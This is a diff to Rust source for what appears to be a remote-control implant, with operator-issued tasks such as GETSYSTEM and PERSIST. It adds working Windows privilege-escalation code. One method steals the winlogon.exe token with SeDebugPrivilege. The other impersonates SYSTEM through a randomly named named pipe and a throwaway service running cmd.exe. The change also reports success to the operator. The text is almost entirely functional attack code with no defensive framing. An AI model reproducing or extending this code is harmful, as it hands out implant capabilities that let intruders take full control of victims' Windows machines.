@@ -201,6 +201,28 @@ use windows_sys::Win32::Security::{
     TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_ADJUST_PRIVILEGES,
     SE_PRIVILEGE_ENABLED, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES,
 };
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::Services::{
+    OpenSCManagerW, CreateServiceW, StartServiceW, DeleteService, CloseServiceHandle,
+    SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
+    SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+};
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::Storage::FileSystem::{
+    FILE_FLAG_OVERLAPPED, PIPE_ACCESS_DUPLEX,
+};
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::Pipes::{
+    ConnectNamedPipe, CreateNamedPipeW, ImpersonateNamedPipeClient, PIPE_TYPE_BYTE,
+};
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::IO::{CancelIoEx, OVERLAPPED};
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::Threading::{
+    CreateEventW, WaitForSingleObject, GetCurrentThreadId,
+};
 
 #[cfg(target_os = "windows")]
 unsafe fn enable_priv(htok: HANDLE, priv_name: &str) -> bool {
@@ -314,45 +336,117 @@ unsafe fn token_make(user: &str, domain: &str, pass: &str) -> String {
 
 #[cfg(target_os = "windows")]
 unsafe fn get_system() -> String {
+    // ── T1: SeDebugPrivilege + winlogon token steal ──────────────────────
     let mut hself = 0isize;
     if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut hself) != 0 {
         enable_priv(hself, "SeDebugPrivilege");
         CloseHandle(hself);
     }
-    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if snap == INVALID_HANDLE_VALUE { return "CreateToolhelp32Snapshot failed".into(); }
-    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
-    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
-    let mut sys_pid = 0u32;
-    if Process32First(snap, &mut pe) != 0 {
-        loop {
-            let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
-            let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
-            if name.eq_ignore_ascii_case("winlogon.exe") { sys_pid = pe.th32ProcessID; break; }
-            if Process32Next(snap, &mut pe) == 0 { break; }
+    'T1: {
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snap == INVALID_HANDLE_VALUE { break 'T1; }
+        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
+        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
+        let mut sys_pid = 0u32;
+        if Process32First(snap, &mut pe) != 0 {
+            loop {
+                let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
+                let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
+                if name.eq_ignore_ascii_case("winlogon.exe") { sys_pid = pe.th32ProcessID; break; }
+                if Process32Next(snap, &mut pe) == 0 { break; }
+            }
         }
-    }
-    CloseHandle(snap);
-    if sys_pid == 0 { return "winlogon.exe not found".into(); }
-    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sys_pid);
-    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
-    let mut htok = 0isize;
-    if OpenProcessToken(hproc, TOKEN_DUPLICATE, &mut htok) == 0 {
+        CloseHandle(snap);
+        if sys_pid == 0 { break 'T1; }
+        let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sys_pid);
+        if hproc == 0 { break 'T1; }
+        let mut htok = 0isize;
+        if OpenProcessToken(hproc, TOKEN_DUPLICATE, &mut htok) == 0 { CloseHandle(hproc); break 'T1; }
         CloseHandle(hproc);
-        return format!("OpenProcessToken failed (err {})", GetLastError());
-    }
-    CloseHandle(hproc);
-    let mut hdup = 0isize;
-    DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
-        SecurityImpersonation, TokenImpersonation, &mut hdup);
-    CloseHandle(htok);
-    if hdup == 0 { return format!("DuplicateTokenEx failed (err {})", GetLastError()); }
-    if ImpersonateLoggedOnUser(hdup) == 0 {
+        let mut hdup = 0isize;
+        DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
+            SecurityImpersonation, TokenImpersonation, &mut hdup);
+        CloseHandle(htok);
+        if hdup == 0 { break 'T1; }
+        if ImpersonateLoggedOnUser(hdup) == 0 { CloseHandle(hdup); break 'T1; }
         CloseHandle(hdup);
-        return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
+        return format!("[+] T1 SYSTEM (winlogon PID={})", sys_pid);
     }
-    CloseHandle(hdup);
-    format!("[+] SYSTEM token (winlogon PID={})", sys_pid)
+
+    // ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
+    let rnd = {
+        let pid = std::process::id();
+        let tid = GetCurrentThreadId();
+        pid.wrapping_mul(0x41C64E6D).wrapping_add(tid).wrapping_add(0x1337)
+    };
+    let pipe_name = format!(r"\\.\pipe\svc{:08x}", rnd);
+    let svc_name  = format!("svc{:08x}", rnd ^ 0xdeadbeef_u32);
+    let bin_path  = format!("cmd.exe /c echo . > {}", pipe_name);
+
+    fn to_wide(s: &str) -> Vec<u16> {
+        s.encode_utf16().chain(std::iter::once(0)).collect()
+    }
+    let wpipe = to_wide(&pipe_name);
+    let wsvc  = to_wide(&svc_name);
+    let wbin  = to_wide(&bin_path);
+
+    let h_pipe = CreateNamedPipeW(
+        wpipe.as_ptr(),
+        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
+        PIPE_TYPE_BYTE,
+        1, 512, 512, 0, std::ptr::null(),
+    );
+    if h_pipe == INVALID_HANDLE_VALUE {
+        return format!("[-] T1+T2 failed (CreateNamedPipe err {})", GetLastError());
+    }
+
+    let h_scm = OpenSCManagerW(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
+    if h_scm == 0 {
+        CloseHandle(h_pipe);
+        return format!("[-] T1+T2 failed (OpenSCManager err {}, need local admin)", GetLastError());
+    }
+
+    let h_svc = CreateServiceW(
+        h_scm, wsvc.as_ptr(), wsvc.as_ptr(), SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+        wbin.as_ptr(), std::ptr::null(), std::ptr::null_mut(),
+        std::ptr::null(), std::ptr::null(), std::ptr::null(),
+    );
+    if h_svc == 0 {
+        CloseServiceHandle(h_scm); CloseHandle(h_pipe);
+        return format!("[-] T1+T2 failed (CreateService err {})", GetLastError());
+    }
+
+    let h_event = CreateEventW(std::ptr::null(), 1, 0, std::ptr::null());
+    if h_event == 0 {
+        DeleteService(h_svc); CloseServiceHandle(h_svc); CloseServiceHandle(h_scm);
+        CloseHandle(h_pipe);
+        return "[-] T1+T2 failed (CreateEvent)".into();
+    }
+
+    let mut ov: OVERLAPPED = std::mem::zeroed();
+    ov.hEvent = h_event;
+
+    StartServiceW(h_svc, 0, std::ptr::null());
+    ConnectNamedPipe(h_pipe, &mut ov); /* async — ERROR_IO_PENDING expected */
+
+    let wr = WaitForSingleObject(h_event, 15000);
+
+    DeleteService(h_svc); CloseServiceHandle(h_svc); CloseServiceHandle(h_scm);
+    CloseHandle(h_event);
+
+    if wr != WAIT_OBJECT_0 {
+        CancelIoEx(h_pipe, &ov);
+        CloseHandle(h_pipe);
+        return format!("[-] T1+T2 failed (T2 pipe timeout res={})", wr);
+    }
+
+    let ok = ImpersonateNamedPipeClient(h_pipe);
+    CloseHandle(h_pipe);
+    if ok == 0 {
+        return format!("[-] T1+T2 failed (ImpersonateNamedPipeClient err {})", GetLastError());
+    }
+    "[+] T2 SYSTEM (named pipe + service)".into()
 }
 
 #[cfg(target_os = "windows")]
@@ -827,7 +921,11 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         #[cfg(target_os = "windows")]
         "GETSYSTEM" => {
             let r = unsafe { get_system() };
-            t.send_result(task.id, &r, "");
+            if r.starts_with("[+]") {
+                t.send_result_admin(task.id, &r, "", true);
+            } else {
+                t.send_result(task.id, &r, "");
+            }
         }
         #[cfg(target_os = "windows")]
         "PERSIST" => {
